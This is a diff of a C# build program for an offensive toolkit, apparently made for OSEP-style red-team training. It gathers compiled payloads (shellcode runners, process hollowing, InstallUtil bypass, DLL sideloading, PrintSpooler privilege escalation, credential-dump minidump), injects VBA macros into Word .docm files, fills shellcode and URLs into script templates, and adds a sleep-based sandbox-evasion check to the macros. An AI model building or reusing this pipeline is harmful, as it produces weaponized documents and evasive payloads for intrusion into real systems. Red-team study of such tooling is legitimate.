@@ -21,7 +21,7 @@ using Word = Microsoft.Office.Interop.Word;
 
 namespace Build
 {
-    internal class Entry_build
+    internal class build
     {
 
 
@@ -29,8 +29,19 @@ namespace Build
 
         private static int Main(string[] args)
         {
-            Console.WriteLine("test");
-            GenerateMacroDocs(args);
+            
+
+
+            Console.WriteLine("\n\n\n[START BUILD]");
+
+            Console.WriteLine("[+] Gathering artifacts...");
+            GatherArtifacts(args);
+
+            Console.WriteLine("[+] Injecting Macros into Word documents...");
+            GenerateWordDocuments(args);
+
+            Console.WriteLine("[+] Generating script Templates...");
+            GenerateScripts(args);
 
 
             //BuildTemplates(args);
@@ -268,97 +279,133 @@ namespace Build
             Console.WriteLine($"Copied: {source} -> {destination}");
         }
     
-        public enum ByteCodeLang
+
+        private static void GatherArtifacts(string[] args)
         {
-            vba,
-            c,
-            ps1,
-            python
+
+            //First lets define our artifacts. Where they are, their name, and any supplemetary info.
+            List<Artifact> artifacts = new List<Artifact>();
+
+
+            //artifacts.Add(new Artifact("LOCATION", "NAME", ArtifactType.?));
+            artifacts.Add(new Artifact("DLL Callback - Invokable", "call-invokable.dll", ArtifactType.Callback));
+            artifacts.Add(new Artifact("DLL Shellcode - Invokable", "sc-invokable.dll", ArtifactType.DLL));
+            artifacts.Add(new Artifact("DLL Sideload Proxy", "sideload.dll", ArtifactType.DLL));
+            artifacts.Add(new Artifact("EXE Elevation PrintSpool", "el-printspool.exe", ArtifactType.PrivEsc));
+            artifacts.Add(new Artifact("EXE Hollow Process", "sc-hollow.exe", ArtifactType.PE));
+            artifacts.Add(new Artifact("EXE InstallUtil Bypass", "iu-bypass.exe", ArtifactType.PE));
+            artifacts.Add(new Artifact("EXE InstallUtil Bypass Reflection Download", "iu-bypass-reflection.exe", ArtifactType.PE));
+            artifacts.Add(new Artifact("EXE InstallUtil Callback InvokeReflection", "iu-call-ps-invokereflection.exe", ArtifactType.Callback));
+            artifacts.Add(new Artifact("EXE InstallUtil Callback Test", "iu-call-ps-curl.exe", ArtifactType.Callback));
+            artifacts.Add(new Artifact("EXE Minidump", "minidump.exe", ArtifactType.Tools));
+            artifacts.Add(new Artifact("EXE PowerShell Runspace Reflection", "ps-rs-reflection.exe", ArtifactType.PE));
+            artifacts.Add(new Artifact("EXE PowerShell Runspace Reflection Download", "ps-rs-reflection-download.exe", ArtifactType.PE));
+            artifacts.Add(new Artifact("EXE Powershell Runspace Static", "ps-rs-static.exe", ArtifactType.PE));
+            artifacts.Add(new Artifact("EXE Shellcode Runner", "sc-runner.exe", ArtifactType.PE));
+            artifacts.Add(new Artifact("HelperTool", "ambiguously-named-tool.exe", ArtifactType.Tools));
+
+
+
+            string solution_dir = args[0];
+
+            //Prep dir structure
+            try { Directory.Delete($"{solution_dir}\\ARTIFACTS", true); } catch { }
+            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS");
+            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\PE");
+            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\DLL");
+            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\Callback");
+            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\PrivEsc");
+            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\Tools");
+
+            foreach (Artifact a in artifacts)
+            {
+                try
+                {
+                    Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}");
+
+                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.exe"))
+                    {
+                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64");
+                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.exe", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64\\{a.FileName}");
+                    }
+
+                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.exe"))
+                    {
+                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86");
+                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.exe", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86\\{a.FileName}");
+                    }
+
+                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.dll"))
+                    {
+                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64");
+                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.dll", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64\\{a.FileName}");
+                    }
+
+                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.dll"))
+                    {
+                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86");
+                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.dll", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86\\{a.FileName}");
+                    }
+
+
+
+                }
+                catch (Exception ex)
+                {
+                    
+                    Console.WriteLine($"\nError: {ex.Message}\n");
+                    
+                }
+            }
+
+
+
+
+
 
         }
 
-        private static void BuildTemplates(string[] args)
+        private static string Name2Dir(string input)
         {
-            if (!Directory.Exists($"{args[0]}\\Artifacts"))
+            //convert shorthand file name to full text
+            string[] parts = input.Split('.');
+            string output = parts[0];
+            output = output.Replace("iu-","InstallUtil ");
+            output = output.Replace("sc-", "Shellcode ");
+            output = output.Replace("ps-", "PowerShell ");
+            output = output.Replace("rs-", "Runspace ");
+            output = output.Replace("el-", "Elevate ");
+            output = output.Replace("call-", "Callback ");
+            output = output.Replace("-", " ");
+
+            return output;
+        }
+
+        private static void GenerateScripts(string[] args)
+        {
+            //This function is going to copy all the scripts in Templates to Artifacts.
+            //However, it will first remove all the template palceholders.
+
+
+            //Ensure the Artifacts dir exists
+            if (!Directory.Exists($"{args[0]}\\ARTIFACTS\\scripts"))
             {
-                Directory.CreateDirectory($"{args[0]}\\Artifacts");
+                Directory.CreateDirectory($"{args[0]}\\ARTIFACTS\\scripts");
+            }else
+            {
+                Directory.Delete($"{args[0]}\\ARTIFACTS\\scripts",true);
+                Directory.CreateDirectory($"{args[0]}\\ARTIFACTS\\scripts");
             }
+
 
             string[] files = Directory.GetFiles($"{args[0]}\\Templates");
             foreach (string f in files)
             {
                 FileInfo fi = new FileInfo(f);
-                string text = File.ReadAllText(fi.FullName);
-
-                text = text.Replace("{MACRO_NAME}", CONFIG.MACRO_NAME);
-                text = text.Replace("{HTTP_URL}", CONFIG.HTTP_URL);
-                text = text.Replace("{BINARY_NAME}", CONFIG.BINARY_NAME);
-                text = text.Replace("{WAIT_TIME_SECONDS}", CONFIG.WAIT_TIME_SECONDS);
-                text = text.Replace("{POWERSHELL_SCRIPT_NAME}", CONFIG.POWERSHELL_SCRIPT_NAME);
-                text = text.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);
-
-
-                //This block is going to add a simple time check to any VBA macros
-                if (CONFIG.DETECT_SANDBOX_TIME)
-                {
-                    StringBuilder sb = new StringBuilder();
-                    if (fi.Extension == ".vba")
-                    {
-                        sb.AppendLine($"    Dim t1 As Date");
-                        sb.AppendLine($"    Dim t2 As Date");
-                        sb.AppendLine($"    Dim time As Long");
-                        sb.AppendLine($"    t1 = Now()");
-                        sb.AppendLine($"    Sleep (2000)");
-                        sb.AppendLine($"    t2 = Now()");
-                        sb.AppendLine($"    time = DateDiff(\"s\", t1, t2)");
-                        sb.AppendLine($"    If time < 2 Then");
-                        sb.AppendLine($"        Exit Function");
-                        sb.AppendLine($"    End If");
-                    }
-
-                    text = text.Replace("{DETECT_SANDBOX_TIME}", sb.ToString());
-                }
-                else
-                {
-                    text = text.Replace("{DETECT_SANDBOX_TIME}", "");
-                }
-
-                if (fi.Extension == ".ps1")
-                {
-                    if (CONFIG.ENCODED)
-                    {
-                        string ff = $"{args[0]}\\Templates\\tmp_ps_decode_func.txt";
-                        string func = File.ReadAllText(ff);
-                        text = func + "\n\n" + text;
-                    }
-                }
-
-
-                //Convert shellcode strings to appropriate language
-                if (fi.Extension == ".ps1")
-                {
-                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.ps1));
-
-                    if (CONFIG.ENCODED)
-                    {
-                        text = text.Replace("{DECODE}", $"${CONFIG.SHELLCODE_NAME} = Decode-Buffer -InputBuffer ${CONFIG.SHELLCODE_NAME} -Key ([byte]0x{CONFIG.KEY.ToString("X2")})");
-                    }
-
-                } else if (fi.Extension == ".vba") 
-                {
-                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.vba));
-                } else if (fi.Extension == ".py")
-                {
-                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.python));
-                } else if (fi.Extension == ".c" || fi.Extension == ".cpp" || fi.Extension == ".h" || fi.Extension == ".hpp") 
-                {
-                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.c));
-                }
-
-                text = text.Replace("{DECODE}", "");
+                string text = DeTemplate(File.ReadAllText(fi.FullName),fi,args);
 
                 //Write to artifacts folder
-                string nf = f.Replace("Templates", "Artifacts");
+                string nf = f.Replace("Templates", "ARTIFACTS\\scripts");
                 File.WriteAllText(nf, text);
             }
 
@@ -367,28 +414,30 @@ namespace Build
 
 
             //DotNetToJsTemplates
-            string dn2js_location = $"{args[0]}\\DotNetToJScript\\bin\\Release\\DotNetToJScript.exe";
-            string dll_location = $"{args[0]}\\artifacts\\x64\\Shellcode_Invokable.dll";
-            string out_location = $"{args[0]}\\artifacts\\rundll_invokable.js";
-            string cmdline = $"{dn2js_location} \"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEPRunner";
 
 
-            Process.Start($"{dn2js_location}",$"\"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEP.OSEPRunner");
+            //string dn2js_location = $"{args[0]}\\DotNetToJScript\\bin\\x64\\DotNetToJScript.exe";
+            //string dll_location = $"{args[0]}\\ARTIFACTS\\DLL\\Shellcode invokable\\x64\\sc-invokable.dll";
+            //string out_location = $"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable.js";
+            //string cmdline = $"{dn2js_location} \"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEP.OSEPRunner";
+
+
+            //Process.Start(cmdline);
 
 
         }
 
-
-
-
-        public static void GenerateMacroDocs(string[] args)
+        public static void GenerateWordDocuments(string[] args)
         {
-
+            //This function will search for macro templates and begin injecting them into the word docm template as copies
+            
+            //Directory variables
             string baseDir = Path.GetFullPath(args[0]);
             string searchDir = baseDir + @"\Templates\vba\";
-            string outputDir = baseDir + @"\artifacts\docm\";
+            string outputDir = baseDir + @"\ARTIFACTS\docm\";
 
 
+            //Flush output directory.
             if (Directory.Exists(outputDir))
             {
                 Directory.Delete(outputDir, true);
@@ -397,18 +446,25 @@ namespace Build
 
 
 
-
+            //Find all files
             string[] files = Directory.GetFiles(searchDir);
 
+
+            //iterate over all files.
             foreach (string file in files)
             {
+                //exit if not vba file
                 if (!file.EndsWith(".vba"))
                     continue;
 
+                //build output file name
                 FileInfo fi = new FileInfo(file);
                 string outFile = outputDir + fi.Name.Replace(".vba", "") + ".docm";
+
+                //Remove template palceholders
                 string macroText = DeTemplate(File.ReadAllText(file),fi, args);
 
+                //Inject the macro and save to output file.
                 InjectMacro(file, outFile, macroText);
             }
 
@@ -418,6 +474,11 @@ namespace Build
 
         public static void InjectMacro(string inputPath, string outputPath, string macroText)
         {
+            //ChatGPT and Aspose.Word ... I command you to lead me to great victory!!!!
+
+            //I didn't write this function.
+            //It works, but could probably be improved.
+
 
             var document = new Document(inputPath);
 
@@ -459,8 +520,12 @@ namespace Build
     
         public static string DeTemplate(string Input, FileInfo fi, string[] args)
         {
+            //This will remove template placeholders from a string.
+
             string output = Input;
 
+            //because we are running this multiple times (Just incase there are template palceholders inside of templates)
+            //This flag prevents literal functions from being written to the doc multiple times.
             bool FunctionsAdded = false;
 
             for (int i=0;i<=5;i++)
@@ -474,33 +539,38 @@ namespace Build
                 output = output.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);
                 output = output.Replace("{INSTALL_UTIL_EXE_PATH}", CONFIG.INSTALL_UTIL_EXE_PATH);
 
-                //This block is going to add a simple time check to any VBA macros
-                if (CONFIG.DETECT_SANDBOX_TIME)
-                {
-                    StringBuilder sb = new StringBuilder();
-                    if (fi.Extension == ".vba")
-                    {
-                        sb.AppendLine($"    Dim t1 As Date");
-                        sb.AppendLine($"    Dim t2 As Date");
-                        sb.AppendLine($"    Dim time As Long");
-                        sb.AppendLine($"    t1 = Now()");
-                        sb.AppendLine($"    Sleep (2000)");
-                        sb.AppendLine($"    t2 = Now()");
-                        sb.AppendLine($"    time = DateDiff(\"s\", t1, t2)");
-                        sb.AppendLine($"    If time < 2 Then");
-                        sb.AppendLine($"        Exit Function");
-                        sb.AppendLine($"    End If");
-                    }
+                
 
-                    output = output.Replace("{DETECT_SANDBOX_TIME}", sb.ToString());
-                }
-                else
-                {
-                    output = output.Replace("{DETECT_SANDBOX_TIME}", "");
-                }
-
+                //This block should only run once in theory.
                 if (!FunctionsAdded)
                 {
+
+                    //This block is going to add a simple time check to any VBA macros
+                    if (CONFIG.DETECT_SANDBOX_TIME)
+                    {
+                        StringBuilder sb = new StringBuilder();
+                        if (fi.Extension == ".vba")
+                        {
+                            sb.AppendLine($"    Dim t1 As Date");
+                            sb.AppendLine($"    Dim t2 As Date");
+                            sb.AppendLine($"    Dim time As Long");
+                            sb.AppendLine($"    t1 = Now()");
+                            sb.AppendLine($"    Sleep (2000)");
+                            sb.AppendLine($"    t2 = Now()");
+                            sb.AppendLine($"    time = DateDiff(\"s\", t1, t2)");
+                            sb.AppendLine($"    If time < 2 Then");
+                            sb.AppendLine($"        Exit Function");
+                            sb.AppendLine($"    End If");
+                        }
+
+                        output = output.Replace("{DETECT_SANDBOX_TIME}", sb.ToString());
+                    }
+                    else
+                    {
+                        output = output.Replace("{DETECT_SANDBOX_TIME}", "");
+                    }
+
+                    //Adds custom decode block to ps1 files if needed.
                     if (fi.Extension == ".ps1")
                     {
                         if (CONFIG.ENCODED)
@@ -511,6 +581,8 @@ namespace Build
                         }
                     }
 
+
+                    //Lets only do this once per file.
                     FunctionsAdded = true;
                 }
 
@@ -547,22 +619,35 @@ namespace Build
 
             return output;
         }
-    
+
     }
 
+    public enum ByteCodeLang
+    {
+        vba, c, ps1, python
 
+    }
 
+    public enum ArtifactType
+    {
+        Callback, DLL, PE, Tools, PrivEsc
+    }
 
+    public class Artifact
+    {
+        public string LocationBase { get; set; }
+        public string FileName { get; set; }
+        public ArtifactType ArtifactType { get; set; }
 
+        //Constructor
 
-
-
-
-
-
-
-
-
+        public Artifact(string locBase, string locName, ArtifactType locType)
+        {
+            LocationBase = locBase;
+            FileName = locName;
+            ArtifactType = locType;
+        }
+    }
 
 
 
